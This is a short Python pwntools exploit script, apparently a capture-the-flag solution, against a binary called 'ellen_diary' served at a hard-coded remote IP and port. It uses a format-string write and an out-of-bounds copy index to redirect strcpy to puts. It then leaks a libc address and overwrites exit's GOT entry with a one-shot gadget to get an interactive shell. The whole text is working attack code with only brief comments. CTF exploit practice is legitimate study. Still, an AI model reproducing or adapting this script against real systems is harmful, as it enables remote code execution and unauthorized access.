from pwn import *

# r = process("./ellen_diary")
r = remote("112.213.2.13", 40001)

strcpy_got = 0x602018 # GOT address of strcpy()
exit_got = 0x602060 # GOT address of exit()
puts_plt = 0x4006c0 # PLT address of puts()
offset_stdout = 0x3ec760 # offset of stdout from libc base
offset_oneshot = 0x10a45c # offset of oneshot gadget from libc base

def write_on_stack(format, data):
    r.sendlineafter("> ", "1")
    r.sendafter("write on stack > ", format)
    r.sendlineafter(">> ", data)

def write_on_data(data):
    r.sendlineafter("> ", "2")
    r.sendafter("write on data > ", data)

def make_a_copy(index):
    r.sendlineafter("> ", "3")
    r.sendlineafter("index for copy > ", str(index))

def stop_writing():
    r.sendlineafter("> ", "4")

make_a_copy(-4)
write_on_stack(b"%7$s".ljust(8, b'\x00') + p64(strcpy_got), p64(puts_plt)[:-2]) # strcpy() -> puts()

# libc leak
make_a_copy(0)
stdout = u64(r.recvn(6).ljust(8, b'\x00')) # address of stdout
libc = stdout - offset_stdout # libc base
log.info("libc base: " + hex(libc))
oneshot = libc + offset_oneshot # address of oneshot gadget

write_on_stack(b"%7$s".ljust(8, b'\x00') + p64(exit_got), p64(oneshot)) # exit() -> oneshot
stop_writing()

r.interactive()